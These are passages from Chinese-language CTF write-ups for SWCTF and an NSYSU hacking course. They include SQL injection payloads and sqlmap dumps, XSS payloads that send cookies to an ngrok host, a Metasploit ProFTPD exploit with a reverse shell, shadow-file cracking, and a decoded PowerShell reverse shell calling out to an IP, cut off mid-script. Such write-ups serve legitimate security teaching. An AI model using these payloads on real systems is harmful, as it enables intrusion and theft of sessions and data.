MuMu 介紹好用的 .NET 反編譯工具 dnSpy。 簡單翻一翻會看到加密相關的函式，可以知道程式會將輸入字串進行加密後進行比對，所以我說那個要比對的對象勒？ 翻了一陣子發現是被藏在一個類似資源庫(Resource)的地方。 沿路點進 address 就會看到一串 Hex 了，我們可以簡單寫個扣還原。 （感謝 @stavhaygn 提醒可以直接右鍵以 C# array 格式複製，會比較好處理一點XD） new byte[] { 0x20, 0x17, 0x00, 0x00, 0x00, 0x32, 0x09, 0x05, 0x2E, 0x27, 0xF8, 0xE8, 0x19, 0x14, 0x0F, 0x1A, 0x14, 0x0E, 0x05, 0x08, 0x03, 0xF9, 0x30, 0xFB, 0x09, 0xF8, 0x0C, 0x08 }; 個人是用 Python 直接偷懶一波，還原的部分看圖一應該不需要解釋吧 w cipher = [0x20, 0x17, 0x00, 0x00, 0x00, 0x32, 0x09, 0x05, 0x2E, 0x27, 0xF8, 0xE8, 0x19, 0x14, 0x0F, 0x1A, 0x14, 0x0E, 0x05, 0x08, 0x03, 0xF9, 0x30, 0xFB, 0x09, 0xF8, 0x0C, 0x08] ans = \"\".join([ chr((i+75) \u0026 0xff) for i in cipher ]) print(ans[::-1]) SWCTF{DNSPY_eZ_d3CryPT} ","date":"2021-01-01","objectID":"/posts/2021/swctf-0x7e4-writeups/:35:0","tags":["SWCTF","CTF-Writeup"],"title":"[Writeup] SWCTF 0x7e4","uri":"/posts/2021/swctf-0x7e4-writeups/"},{"categories":["資訊安全 Cyber Security"],"content":"disseminate (中科-Misc, Score: 367, Unsolved) Can you find different flag in the article? Released file (txt) 官方解 https://hackmd.io/@swctf/writeups/%2Fs%2FB1mfrsTAP#disseminate （原來是和 picoCTF 一樣的套路，我整篇拿去 Google 難怪沒結果==） ","date":"2021-01-01","objectID":"/posts/2021/swctf-0x7e4-writeups/:36:0","tags":["SWCTF","CTF-Writeup"],"title":"[Writeup] SWCTF 0x7e4","uri":"/posts/2021/swctf-0x7e4-writeups/"},{"categories":["資訊安全 Cyber Security"],"content":"My first SQL Injection (靜宜-Web, Score: 308, Unsolved) 小明想成為跟 TIM 哥一樣厲害的駭客，正在自學資訊安全，研究完 SQL Injection 後想要小試身手 http://swctf.hackersir.org:20002/ 官方解 https://hackmd.io/@swctf/writeups/%2Fs%2FHkxeTpu6w#My-first-SQL-Injection ","date":"2021-01-01","objectID":"/posts/2021/swctf-0x7e4-writeups/:37:0","tags":["SWCTF","CTF-Writeup"],"title":"[Writeup] SWCTF 0x7e4","uri":"/posts/2021/swctf-0x7e4-writeups/"},{"categories":["資訊安全 Cyber Security"],"content":"Google It Yourself (逢甲-Web, Score: 200, Unsolved) 如果有 Google 不到的問題，那就再多 Google 幾次 http://swctf.hackersir.org:20201/ 雖然知道網址點下去會跳轉到 LMGTFY，但戳了一下 curl 和 wget 沒結果就放棄了，結果只是我不會用 curl 嗚嗚。 curl -i http://swctf.hackersir.org:20201/ Enter 敲下去直接就噴 Flag 了。 HTTP/1.1 302 Found Date: Fri, 01 Jan 2021 12:01:11 GMT Server: Apache/2.4.38 (Debian) X-Powered-By: PHP/7.4.13 Flag: SWCTF{G0ogle_It_YoUr53Lf} Location: https://lmgtfy.app/?q=pls+give+me+the+flag Content-Length: 0 Content-Type: text/html; charset=UTF-8 SWCTF{G0ogle_It_YoUr53Lf} ","date":"2021-01-01","objectID":"/posts/2021/swctf-0x7e4-writeups/:38:0","tags":["SWCTF","CTF-Writeup"],"title":"[Writeup] SWCTF 0x7e4","uri":"/posts/2021/swctf-0x7e4-writeups/"},{"categories":["資訊安全 Cyber Security"],"content":"Stupid Session Revenge (逢甲-Web, Score: 200, Unsolved) 管理員學聰明了，改用了先進的技術來保護他的網站 http://swctf.hackersir.org:20204/ 測試帳密：test : test 官方解 https://hackmd.io/@swctf/writeups/%2Fs%2FHJs9tbpRv#Stupid-Session-Revenge （知道是 JWT 的題目，但我好像都沒解出來過QQ） ","date":"2021-01-01","objectID":"/posts/2021/swctf-0x7e4-writeups/:39:0","tags":["SWCTF","CTF-Writeup"],"title":"[Writeup] SWCTF 0x7e4","uri":"/posts/2021/swctf-0x7e4-writeups/"},{"categories":["資訊安全 Cyber Security"],"content":"admin (中科-Web, Score: 499, Unsolved) Only admin can visit this page. http://swctf.hackersir.org:20100/ 官方解 https://hackmd.io/@swctf/writeups/%2Fs%2FB1mfrsTAP#admin （還真沒想過在 X-Forwarded-For 動手腳 XD） ","date":"2021-01-01","objectID":"/posts/2021/swctf-0x7e4-writeups/:40:0","tags":["SWCTF","CTF-Writeup"],"title":"[Writeup] SWCTF 0x7e4","uri":"/posts/2021/swctf-0x7e4-writeups/"},{"categories":["資訊安全 Cyber Security"],"content":"Writeups 搬自 MacacaHub HTCF HW 0x02 Author: @stavhaygn Writeup By: @yctseng1227 這兩題都出自今年 CISC2020 - Day 1，由我們 MacacaHub 團隊負責的基礎網頁安全演練，當時 3 小時的時間沒辦法帶完課程實在有點可惜，身為 MacacaHub 助教的我當然不能洩氣，這次遇到相似ㄉ題目速速在最短時間解決 \u003ew\u003c!! ","date":"2020-12-09","objectID":"/posts/2020/nsysu-htcf-hw2/:0:0","tags":["NSYSU 駭客攻防","CTF-Writeup"],"title":"[NSYSU 駭客攻防] HW 0x02 Writeups","uri":"/posts/2020/nsysu-htcf-hw2/"},{"categories":["資訊安全 Cyber Security"],"content":"news (160 points) ","date":"2020-12-09","objectID":"/posts/2020/nsysu-htcf-hw2/:1:0","tags":["NSYSU 駭客攻防","CTF-Writeup"],"title":"[NSYSU 駭客攻防] HW 0x02 Writeups","uri":"/posts/2020/nsysu-htcf-hw2/"},{"categories":["資訊安全 Cyber Security"],"content":"Description 我都唸 SQL 。 不對，應該要唸 SQL ！ 雖然我朋友都唸 SQL ，但我覺得應該要唸 SQL 。 可是我都唸 SQL。 https://news.macacahub.tw/ ","date":"2020-12-09","objectID":"/posts/2020/nsysu-htcf-hw2/:1:1","tags":["NSYSU 駭客攻防","CTF-Writeup"],"title":"[NSYSU 駭客攻防] HW 0x02 Writeups","uri":"/posts/2020/nsysu-htcf-hw2/"},{"categories":["資訊安全 Cyber Security"],"content":"Solution 乍看之下是個普通的公告欄，隨意點進其中一則可以發現網址列帶 id 參數，題目已經提示是 SQL injection (SQLi) ，因此可以直接從網址的 id 參數下手作為注入點。其中，這種查詢資料庫類型的 SQLi ，我們可以搭配 UNION SELECT 針對可顯示資訊的頁面進行查詢。 第一步，起手式用 ORDER BY 來推測查詢表格欄位的數目。 https://news.macacahub.tw/new.php?id=1 ORDER BY 3 # success https://news.macacahub.tw/new.php?id=1 ORDER BY 4 # fail Tip 通常這類的 SQLi 後面常常會用 #、-- 之類的把系統後面的語句註解掉，但這題後面沒有其他查詢所以就可以省略了 w 同時，要注意通常網址送出去都會被轉換成 URL encode（ e.g. (空格) = ‘%20’ ） 經過測試可以知道 id 的資料型態為整數，且測到 ORDER BY 4 網頁就沒有顯示畫面，表示查詢表格的欄位數為 3，如此一來我們就可以用 UNION SELECT 串接其他 SQL 的查詢語句（注意 UNION SELECT 後面接的查詢欄位數目必須和前句相同）。 再來，我們嘗試戳 id，先找到一個無法正常查詢到的頁面（ e.g. id=6 ），拿來當作我們進行 SQLi 要顯示結果的畫面，配合剛剛摸索到的欄位數，先來塞個 1, 2, 3 看看會怎麼樣 XD https://news.macacahub.tw/new.php?id=6 UNION SELECT 1,2,3 OK 成功顯示！ 接下來就可以透過 SQL query 想辦法撈出我們想要的資訊，例如：SQL 版本。 https://news.macacahub.tw/new.php?id=6 UNION SELECT @@version,NULL,NULL 用了 MySQL 的版本查詢方式 @@version 發現可以成功撈到版本。 下一步，我們需要先知道現在所在的資料庫名稱。 https://news.macacahub.tw/new.php?id=6 UNION SELECT DATABASE(),NULL,NULL DATABASE() 是 SQL 定義的 function，因此可以輕鬆拿到我們的目標資料庫！當駭客就是這麼簡單 目前可以知道資料庫名稱為 newsdb ，下一步要找的是表格名稱。 https://news.macacahub.tw/new.php?id=6 UNION SELECT GROUP_CONCAT(table_name),NULL,NULL FROM information_schema.tables WHERE table_schema=database() Tip 注意，如果沒有用 GROUP_CONCAT 把 table_name 包起來，在 SQL query 找到第一筆符合條件的資料就會return，不會將所有符合條件的結果都列出來。 這裡開始就會牽涉到 SQL 的結構，這裡用到 information_schema 是 MySQL 這種關聯式資料庫的一種特殊結構描述，用途是儲存資料庫的中繼資料，有興趣的可以參考 飛飛 的 Web Security 魔法使攻略─SQL injection 起手式。 總之，搭配 SQL query 可以撈到資料庫內的兩份表格 FLAGS, News，我們很直覺的猜測 Flag 放在 FLAGS、公告欄訊息放在 News！當然助教也有可能故意放反搞人 下一步，來看看表格內的欄位資訊。 https://news.macacahub.tw/new.php?id=6 UNION SELECT GROUP_CONCAT(column_name),NULL,NULL FROM information_schema.columns WHERE table_schema=database() and table_name='FLAGS' Tip 這邊的 column_name 同理記得用 GROUP_CONCAT() 才能把所有資訊撈出來，如果嫌太輕鬆可以用 LIMIT 慢慢戳（笑） 可以發現只有兩欄，分別是 id 和 flag，剩下就是針對欄位名稱要把我們想知道的 Flag 拿出來！ https://news.macacahub.tw/new.php?id=6 UNION SELECT id,flag,NULL FROM FLAGS 其他有關 SQLi 的 Payload 可以參考這個 https://portswigger.net/web-security/sql-injection/cheat-sheet 當然可以用純手工的方式慢慢戳，但身為肥宅要顧二次元老婆才沒有辣麼多時間，利用 sqlmap 工具更快進行上述這般的 SQLi 拿 Flag，流程上大致相同。 Find Database name $ sqlmap -u https://news.macacahub.tw/new.php\\?id\\=1 --dbs Find Table name $ sqlmap -u https://news.macacahub.tw/new.php\\?id\\=1 -D newsdb --tables Find column type $ sqlmap -u https://news.macacahub.tw/new.php\\?id\\=1 -D newsdb -T FLAGS --columns Dump target FLAGS $ sqlmap -u https://news.macacahub.tw/new.php\\?id\\=1 -D newsdb -T FLAGS --dump 或是，可以用更暴力的方式，不管三七二十一直接 DUMP 就對了！ $ sqlmap -u https://news.macacahub.tw/new.php\\?id\\=1 --dump 有夠兇 ","date":"2020-12-09","objectID":"/posts/2020/nsysu-htcf-hw2/:1:2","tags":["NSYSU 駭客攻防","CTF-Writeup"],"title":"[NSYSU 駭客攻防] HW 0x02 Writeups","uri":"/posts/2020/nsysu-htcf-hw2/"},{"categories":["資訊安全 Cyber Security"],"content":"error messages (220 points) ","date":"2020-12-09","objectID":"/posts/2020/nsysu-htcf-hw2/:2:0","tags":["NSYSU 駭客攻防","CTF-Writeup"],"title":"[NSYSU 駭客攻防] HW 0x02 Writeups","uri":"/posts/2020/nsysu-htcf-hw2/"},{"categories":["資訊安全 Cyber Security"],"content":"Description 說笑話給 admin 拿 session https://message.macacahub.tw/ hint: 政府網站最喜歡用的帳號之一 user 由於解題人數不甚樂觀，助教額外加了其他 Hint: Tip bonus 1: 在登入頁面找 XSS 注入點 bonus 2: XAMPP快速架站 + 記得要用public IP (或是ngrok穿隧) bonus 3: admin 會模擬真人點擊你傳送的連結(笑話) ","date":"2020-12-09","objectID":"/posts/2020/nsysu-htcf-hw2/:2:1","tags":["NSYSU 駭客攻防","CTF-Writeup"],"title":"[NSYSU 駭客攻防] HW 0x02 Writeups","uri":"/posts/2020/nsysu-htcf-hw2/"},{"categories":["資訊安全 Cyber Security"],"content":"Solution 本題主要分兩個部分： a. 弱密碼 弱密碼，顧名思義為了求簡單記憶像是 admin:password，從題目提示「台灣政府網站最喜歡用的帳號之一 user」，加上許多網站開發人員為求方便常常把帳號密碼設定相同，因此這題可以不小心用 user : user 成功登入。 b. XSS 從登入失敗的錯誤提示可以發現 \" Incorrect username or password\" 會同時顯示在網址以 msg 參數列出，對此我們可以嘗試在該處進行測試，發現有 XSS 漏洞。 使用弱密碼登入後，發現由於非 admin 帳號因此無法拿 Flag。 此外網站給了輸入框表示可以說笑話給 admin，嘗試輸入「C8763」被說不好笑QQ 根據提示「admin會模擬真人點擊你傳送的連結」，不難猜到需要透過前述的 XSS 漏洞讓 admin 點擊取得 admin 的 session，再修改網頁的 cookie 拿 Flag，對此我們需要架 server 來接收 admin 的 session。 下圖 terminal 左半部為在 local 開啟的 server，但由於沒有對外的 public IP 可以接收資訊，因此需要用到 ngrok 這個 reverse proxy 工具，如下圖右半部可以看到透過把 local 的 port 映射(map) 到一個 public IP，讓外部能夠透過這個 IP 連到我們的 server。 作為 Web 初學者，簡單說明一下如何快速自建Server。 P.S. 作業環境 Python 3.6 $ sudo pip3 install flask $ sudo pip3 install flask_cors $ python3 app.py code 可參考 app.py 利用登入頁面的 XSS 漏洞測試取得 local 端的 cookie，payload 方面要設定跳轉的 public IP，用 escape 或是 fetch 擷取 cookie。 另外要注意若要字串相加 必須把 + 改成 %2B (URL encode) 不然會被瀏覽器判定成空白導致執行失敗，或是可以改用concat()，以下提供兩種應用方式。 https://message.macacahub.tw/login.php?msg=\u003cscript\u003elocation.href=\"https://\u003ctunnel_id\u003e.ngrok.io/?c=\"%2Bescape(document.cookie)\u003c/script\u003e https://message.macacahub.tw/login.php?msg=\u003cscript\u003efetch('https://\u003ctunnel_id\u003e.ngrok.io/?c='.concat(document.cookie))\u003c/script\u003e 一旦成功偷到 local 端的 cookie，我們就能直接登入把上面的「完整網址」當作笑話餵給admin，模仿對方點擊網址將 admin 的 session 傳到我們的 server，LOL🤣🤣🤣。 最後用 F12大法 或是工具（e.g. Chrome 的 EditThiscookie）把 cookie 換成 admin 的 cookie 再重新整理頁面，拿 Flag。 ","date":"2020-12-09","objectID":"/posts/2020/nsysu-htcf-hw2/:2:2","tags":["NSYSU 駭客攻防","CTF-Writeup"],"title":"[NSYSU 駭客攻防] HW 0x02 Writeups","uri":"/posts/2020/nsysu-htcf-hw2/"},{"categories":["資訊安全 Cyber Security"],"content":" Writeups 搬自 MacacaHub HTCF Midterm writeups Author: @stavhaygn Writeup By: @yctseng1227 這次駭客攻防分成 筆試(1hr) \u0026 上機考(2hr)，根本就是金盾獎2.0，時間分配上要破台不太容易，何況為避免作弊情形還要邊寫題目邊截圖做個簡單報吿（嗚嗚好麻煩），題目難度我個人覺得中間偏易，畢竟助教也是根據老師上課所教的方向出題（甚至還有延伸學習），只是似乎對大部分同學來說比較沒有 CTF 經驗稍嫌困難一點，最後被老師建議下次多出一點基礎題 XDDDDDD 老樣子先放上人權圖，被 MacacaHub 學弟搶走第一名好難過嗚嗚嗚 （唯一錯的那一次是 Flag 圖片打錯字，嗚嗚人生污點） ","date":"2020-11-09","objectID":"/posts/2020/nsysu-htcf-midterm-writeups/:0:0","tags":["NSYSU 駭客攻防","CTF-Writeup"],"title":"[NSYSU 駭客攻防] Midterm Writeups","uri":"/posts/2020/nsysu-htcf-midterm-writeups/"},{"categories":["資訊安全 Cyber Security"],"content":"Scoreboard ","date":"2020-11-09","objectID":"/posts/2020/nsysu-htcf-midterm-writeups/:1:0","tags":["NSYSU 駭客攻防","CTF-Writeup"],"title":"[NSYSU 駭客攻防] Midterm Writeups","uri":"/posts/2020/nsysu-htcf-midterm-writeups/"},{"categories":["資訊安全 Cyber Security"],"content":"Forensics ","date":"2020-11-09","objectID":"/posts/2020/nsysu-htcf-midterm-writeups/:2:0","tags":["NSYSU 駭客攻防","CTF-Writeup"],"title":"[NSYSU 駭客攻防] Midterm Writeups","uri":"/posts/2020/nsysu-htcf-midterm-writeups/"},{"categories":["資訊安全 Cyber Security"],"content":"images 0x1 (100 points, 23 solves) Description images~ images~ images~ hint: flag 在圖片裡 Released file (pcap) Solution Note 聽說不少人用 NetworkMiner 這軟體解得乾淨俐落（？） 不過考試當下封包數量不多就沒想這麼多，因此個人作法比叫偏手工 用 wireshark 開啟 .pcap 後，用 Follow \u003e TCP Stream看大概只有 10 包 stream，其中不乏出現 .png 的 header 如圖。 這部分可以用 File \u003e Export Objects \u003e HTTP... 把指定的檔案 dump 出來（重點是 multipart/form-data）。 可以直接用 save all 把檔案存起來，然後用 hex editor 根據 PNG 的 header 把圖片的修好。 圖片修完就看得到 Flag 了，全部大概五張我當時隨便戳就剛好是 Flag 了 ㄏㄏ ","date":"2020-11-09","objectID":"/posts/2020/nsysu-htcf-midterm-writeups/:2:1","tags":["NSYSU 駭客攻防","CTF-Writeup"],"title":"[NSYSU 駭客攻防] Midterm Writeups","uri":"/posts/2020/nsysu-htcf-midterm-writeups/"},{"categories":["資訊安全 Cyber Security"],"content":"CSS-Keylogger (150 points, 8 solves) Description 有趣的CSS Keylogger文章： CSS keylogger：攻擊與防禦 Stealing Data With CSS: Attack and Defense 嘗試在封包中分析此次的CSS Keylogger攻擊與受害者c7f網站上的信箱與密碼，並且嘗試登入 hint: 運氣好或靠實力拿到小遊戲中的flag吧 網站連結 http://c7f.macacahub.tw/login Released file (pcap) Solution 題目給了兩篇關於 CSS Keylogger 的文章，算是課外補充。 如果認真對網站進行研究會發現該網站被駭入後，CSS Keylogger 寫在 bootstrap.min.css 內（不知道這個也解的出來啦 XD）。 從網站 source code 可以看得出來登入會驗證信箱格式、以及密碼會加鹽再 Hash，因此不用期待能把封包內撈到的 Hash 拿去爆破密碼 =w= 從.pcap封包檔的 Follow \u003e TCP Stream 可以觀察到如文章所提的 CSS Keylogger 帶出的參數。 其中前面的 /e/ 表示 email、/p/ 表示password，也算一種小提示吧。 總之整理前面所觀察到的封包特徵，可以用 filter 簡單過濾出來（當然用 TCP Stream 慢慢點也是可以啦 XD）。 http \u0026\u0026 ip.dst == 45.79.159.73 這樣就能拿到三組帳號，再來就是有點運氣的嘗試登入… 沒錯，會這麼說是因為我拿到帳密戳了半小時都沒成功，最後要放棄時就莫名其妙登入了XDDDDDD 事後和助教討論也沒得到個明確結果，如果有想法歡迎找我們討論QQ 登入後… 抓猴子囉!! 基本上五隻猴子只有一隻點得到Flag，如果不想慢慢用滑鼠點的話可以縮小視窗把他們關起來，或是直接開 source code 找連結拿 Flag !! ","date":"2020-11-09","objectID":"/posts/2020/nsysu-htcf-midterm-writeups/:2:2","tags":["NSYSU 駭客攻防","CTF-Writeup"],"title":"[NSYSU 駭客攻防] Midterm Writeups","uri":"/posts/2020/nsysu-htcf-midterm-writeups/"},{"categories":["資訊安全 Cyber Security"],"content":"images 0x2 (250 points, 1 solve) Description 小朋友才只用工具解題目，大朋友都寫code Released file (pcap) Solution 這題看起來沒有什麼特殊情境，就是很刻意的希望同學用 coding 解決問題XD 基本作法和 駭客攻防 hw_0x01 Writeup 差不多，只是要還原的東西不太一樣。 封包題起手式一樣 Follow \u003e TCP Stream，看到封包內容有 xor_key、image 那就是要把圖片 XOR 還原出來了，方向應該是不難猜，只是在往後看可以發現有多達100個圖片，所以還是乖乖寫扣吧。 順帶一提、xor_key 是用 base64 混淆過，就算 Decode 還原出來也是難以辨識的字串，助教存心不給人手動驗證（雖然圖片好像也很難手工還原就是…）。 scapy 的教學參考上面連結就不再贅述，不過要注意的是撈 Raw 欄位的資料會有兩種情況（如圖），推測是封包太長被截成兩段QQ ，條件判斷上可以根據封包長度或是判斷資料內容是否有關鍵字。最後，我們關心的重點在 xor_key、image 還有 … 檔名!! 寫完就知道了XD 由於資料全部都串在一起，處理上有些麻煩… xor_key 和 image 可以用 \\r\\n 切出來，但 filename 就只能用 Regular Expression 篩出來，不然就是用指定位址的方式（因為圖片長度其實都相同 XD），剩下看扣應該不難懂：） from scapy.all import * import re import base64 pkts = rdpcap('images_0x2.pcap') for p in pkts: if IP in p and p[IP].dst == '140.117.169.219': if Raw in p and b'filename' in p[Raw].load: raw = p[Raw].load filename = re.search(b'filename=\"(\\w*.\\w*)\"', raw) filename = filename.group(1).decode('utf-8') xor_key = base64.b64decode(raw.split(b'\\r\\n')[3]) ciphertext = raw.split(b'\\r\\n')[7] # 用 mod 的方式重複 padding xor_key res = [ word ^ xor_key[idx % len(xor_key)] for idx, word in enumerate(ciphertext) ] img = open(filename, 'wb') img.write(bytes(res)) img.close() 成功把所有圖片 dump 出來，會發現有分兩種檔名，分別是 0-27 還有 時間戳記，剩下就是慢慢拼 Flag 了!! ","date":"2020-11-09","objectID":"/posts/2020/nsysu-htcf-midterm-writeups/:2:3","tags":["NSYSU 駭客攻防","CTF-Writeup"],"title":"[NSYSU 駭客攻防] Midterm Writeups","uri":"/posts/2020/nsysu-htcf-midterm-writeups/"},{"categories":["資訊安全 Cyber Security"],"content":"Pwn ","date":"2020-11-09","objectID":"/posts/2020/nsysu-htcf-midterm-writeups/:3:0","tags":["NSYSU 駭客攻防","CTF-Writeup"],"title":"[NSYSU 駭客攻防] Midterm Writeups","uri":"/posts/2020/nsysu-htcf-midterm-writeups/"},{"categories":["資訊安全 Cyber Security"],"content":"hashmeow (120 points, 2 solves) Description macacahub.tw 又多開了一個 port 提供 ssh 你想要進來拿flag嗎？ 想要的話可以全部給你… 去找吧！我把所有的帳密都放在檔案裡了 Tip hint 1: 檔案從該提供ssh服務的主機掉出來的 hint 2: 10k-most-common.txt 不錯用 hint 3: port_number \u003e 1000 \u0026\u0026 port_number != 8778 \u0026\u0026 port_number != htcf.ports.port_number hint 4: flag在linux某個權限為1777的神奇目錄下 hint 5: 運氣也是種實力 Solution 如果有寫過 htcf 的練習題應該知道掃 port 的起手式就是 nmap，掃描查看 Domain 底下開了哪些 port 的服務 (其中 -p- 等同 -p 0-65535)。 $ nmap -p- macacahub.tw $ nmap -sV -p 55555 macacahub.tw 根據 hint 3 ，我們可以知道目標 port 是 55555，再進一步利用 -sV 查到是 ssh 服務（hint 1），結果如下。 找到連線入口，接下來我們需要 ssh 連線的帳號密碼。 從題目給的 passwd 和 shadow 其實就是存放密碼的檔案，只不過是被 Hash 過的 (可參考 相關文章），如果想知道更細節內容可以去翻 鳥哥的私房菜 - 帳號與身份管理，總之這裡我們需要想辦法把密碼爆破出來!! 根據 hint 2，可以找到字典檔 10k-most-common.txt 並下載至本機端。 再來就是用 hashcat 這個密碼還原工具，題目的 hashmeow 其實就是在暗示這個XDDDD 可參考 hashcat 相關文章，要注意的是 shadow 內的 $6$ 是指 SHA-512，指令要對應到 -m 1800，另外結尾要掛上 --show 不然會沒有結果（笑），針對 shadow 使用 hashcat 可以找到兩組密碼，分別是 root:root 和 shelly:shelly，真的是弱密碼欸… 原來是 hint 5 的部分啊。 接著就是要嘗試用 shelly 的帳號登入（平常並不會有人直接用 root 登入，雖然這題預設也鎖 root 登入）。 最後就是在裡頭找 Flag 啦，根據 hint 4，可以 Google 發現 1777 權限分數其實指的就是 /tmp 目錄，細節同樣可參考 鳥哥私房菜 - 權限應用、程序之觀察與基本管理，進到 /tmp 找到 secret 資料夾後輕鬆拿 Flag。 ","date":"2020-11-09","objectID":"/posts/2020/nsysu-htcf-midterm-writeups/:3:1","tags":["NSYSU 駭客攻防","CTF-Writeup"],"title":"[NSYSU 駭客攻防] Midterm Writeups","uri":"/posts/2020/nsysu-htcf-midterm-writeups/"},{"categories":["資訊安全 Cyber Security"],"content":"hashmeow root (50 points, 1 solve) Description 與hashmeow同題目 但是flag在root的家裡 Solution 承接上題的作法，分數比較低的原因是 Flag 單純放不同資料夾而已 XD 回到根目錄/，並且根據提示移動到 root 目錄會發現權限不足，就連 sudo 也不能用QQ 不過有一招基本的提權方式是 sudo su，那我們可以從 bin 目錄找到 su 並且直接執行，被要求輸入的root密碼就是我們剛剛透過 hashcat 爆出來的 root:root，輕鬆提權!!! 剩下就只是回 /root，拿 Flag !! ","date":"2020-11-09","objectID":"/posts/2020/nsysu-htcf-midterm-writeups/:3:2","tags":["NSYSU 駭客攻防","CTF-Writeup"],"title":"[NSYSU 駭客攻防] Midterm Writeups","uri":"/posts/2020/nsysu-htcf-midterm-writeups/"},{"categories":["資訊安全 Cyber Security"],"content":"ProFTPD (120 points, 0 solve) Description 區網中有一個FTP伺服器，好像有漏洞來著(網路遮罩255.255.255.0，不是 xxx.xxx.xxx.1那台主機) 請先ssh遠端連線至攻擊用主機(同CTF平台初始的帳號密碼) 接著在攻擊機的區網中找出有漏洞的主機 並且exploit有漏洞的主機 最後取得\"/var/www/html/_backup\"目錄下的flag檔 ssh -p 8778 {你的帳號}@macacahub.tw hint: 建議修改預設LPORT Solution 登入\"攻擊用主機\"後，根據題目描述要從區網中找出有漏洞的主機（也提示 FTP Server），先找到目前主機的 IP ，再透過 nmap 掃區網。 以本題為例，IP 為 172.30.0.3，則區網掃描可以用 172.30.0.0/24 或是 172.30.0.*，先確認 FTP 主機存在再查看版本細項，暴力一點可以直接用 nmap -A 172.30.0.0/24 一次把細節全部列出來。 可以找到該 FTP Server 的版本為 ProFTPD 1.3.5，可以從 Google 發現有漏洞編號 CVE-2015-3306，那就是用上課所學的 Metasploit Framework 嘗試針對這個漏洞進行攻擊。 …沒錯!! 現在登入的這台\"攻擊用主機\"已經把你把相關工具都裝好了，可以直接下 msfconsole 來找關於漏洞相關的工具，如果懶得從 Google 找漏洞編號，也可以直接在 msf 搜尋 ProFTPD 1.3.5 相關攻擊工具。 剩下就是工具使用，如果有寫課堂作業應該知道基本的操作方式..吧XD 參數的設定上 RHOST 目標IP為 nmap 掃出來的 172.30.0.2，SITEPATH 為題目描述的 /var/www/html/（我們其實沒有權限存取 _backup），這題還需要設定 payloads… 而且並不是每一組 payload 都能成功需要一點運氣，不過數量也不多把 payload 全部戳一遍也蠻快der。 設定完 payload 後記得要再確認一次 options，把 LHOST 補上\"攻擊用主機\"，以便打過去的 reverse shell 才能順利彈回來，若攻擊成功就能拿到 FTP Server 的 shell，剩下就是把 flag 撈出來，結束。 $ ifconfig #查看當前主機ip: 172.30.0.3 $ nmap 172.30.0.0/24 #掃區網，找到 FTP 主機(ip 172.30.0.2, port 21) $ nmap -sV -p 21 172.30.0.2 #查看剛主機細部資訊，發現是ProFTPD 1.3.5 $ msfconsole msf5 \u003e search ProFTPD 1.3.5 msf5 \u003e use unix/ftp/proftpd_modcopy_exec msf5 exploit(unix/ftp/proftpd_modcopy_exec) \u003e show options msf5 exploit(unix/ftp/proftpd_modcopy_exec) \u003e set RHOST \u003ctarget_ip\u003e msf5 exploit(unix/ftp/proftpd_modcopy_exec) \u003e set SITEPATH \u003ctarget_directory\u003e msf5 exploit(unix/ftp/proftpd_modcopy_exec) \u003e show payloads msf5 exploit(unix/ftp/proftpd_modcopy_exec) \u003e set payload cmd/unix/reverse_perl msf5 exploit(unix/ftp/proftpd_modcopy_exec) \u003e show options msf5 exploit(unix/ftp/proftpd_modcopy_exec) \u003e set LHOST \u003clocalhost_ip\u003e msf5 exploit(unix/ftp/proftpd_modcopy_exec) \u003e exploit (reverse shell) ls ls _backup cat _backup/f1aaag.txt ","date":"2020-11-09","objectID":"/posts/2020/nsysu-htcf-midterm-writeups/:3:3","tags":["NSYSU 駭客攻防","CTF-Writeup"],"title":"[NSYSU 駭客攻防] Midterm Writeups","uri":"/posts/2020/nsysu-htcf-midterm-writeups/"},{"categories":["資訊安全 Cyber Security"],"content":"Writeups 搬自 MacacaHub HTCF HW 0x01 - Reverse Shell Author: @stavhaygn Writeup By: @yctseng1227 ","date":"2020-11-03","objectID":"/posts/2020/nsysu-htcf-hw1/:0:0","tags":["NSYSU 駭客攻防","CTF-Writeup"],"title":"[NSYSU 駭客攻防] HW 0x01 Writeup","uri":"/posts/2020/nsysu-htcf-hw1/"},{"categories":["資訊安全 Cyber Security"],"content":"reverse shell (250 points) ","date":"2020-11-03","objectID":"/posts/2020/nsysu-htcf-hw1/:1:0","tags":["NSYSU 駭客攻防","CTF-Writeup"],"title":"[NSYSU 駭客攻防] HW 0x01 Writeup","uri":"/posts/2020/nsysu-htcf-hw1/"},{"categories":["資訊安全 Cyber Security"],"content":"Description 我架的破爛網站似乎被攻擊啦~!? 你能幫我從封包檔裡分析出駭客C2的IP、操作的指令、搜集到的資訊與被偷走的檔案內容(含 flag)嗎? 求求你了大大! QAQ ~ \u003c(_ _)\u003e Hint: powershell, reverse shell, symmetric encryption ","date":"2020-11-03","objectID":"/posts/2020/nsysu-htcf-hw1/:1:1","tags":["NSYSU 駭客攻防","CTF-Writeup"],"title":"[NSYSU 駭客攻防] HW 0x01 Writeup","uri":"/posts/2020/nsysu-htcf-hw1/"},{"categories":["資訊安全 Cyber Security"],"content":"Solution 題目給定一封包檔 .pcap 進行分析，在封包數量不多的前提可以用 Follow \u003e TCP stream 把零碎的封包片段組起來方便查看，可以發現全部 14 筆 TCP stream 大部分都算是可讀資訊，但經過一段 PowerShell script 後，有一整段的封包完全不可讀（如圖）。 從 PowerShell 不難看出有經過 Base64 混淆（注意最後的%3D其實就是 URL encode 的=），這題上線的前兩天恰好是中山資安社邀請講師Still 講過的 PowerShell 奇淫巧技，把 Base64 解開來後就跟社課一樣可以逐步分析。 Tip 建議可以用 VSCode 的 highlight 會好看很多 0w0 script 是以 ; 作為語義上的結尾，所以可直接取代成換行\\n (但要注意迴圈內的分號還是需要存在) 加密key $xor_passwd 中間那個是 “0” 不是 “O” … 如果寫錯會還原不完整xD function Get-Xor { $xor_passwd = \"x0R_\" $padding_xor_passwd = ($xor_passwd * [int]($args[0].Length / $xor_passwd.Length)) + $xor_passwd.Substring(0, $args[0].Length % $xor_passwd.Length) $args[0] = [System.Text.Encoding]::UTF8.GetBytes($args[0]) $args[0] = $( for ($i = 0; $i -lt $args[0].Length; $i++) { $args[0][$i] -bxor $padding_xor_passwd[$i] }) [System.Text.Encoding]::UTF8.GetString($args[0]) } $client = New-Object System.Net.Sockets.TCPClient(\"45.79.159.73\", 39637) $stream = $client.GetStream() [byte[]]$bytes = 0..65535|%{0} while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){ $command = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i) $command = Get-Xor $command $response = (iex $command 2\u003e\u00261 | Out-String ) $response = $response + \"PS \" + (pwd).Path + \"\u003e \" $response = GET-Xor $response $response = 